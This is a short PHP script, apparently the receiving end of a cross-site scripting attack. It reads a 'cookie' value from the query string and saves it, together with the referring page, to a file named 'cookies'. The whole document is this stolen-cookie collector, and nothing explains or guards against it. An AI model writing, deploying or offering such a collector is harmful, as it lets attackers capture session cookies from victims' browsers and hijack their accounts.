<?
	if(isset($_GET['cookie'])){
		$file = fopen("cookies","w+");
		fwrite($file,$_GET['cookie'].":".$_SERVER['HTTP_REFERER']);
		fclose($file);
	 }
?>
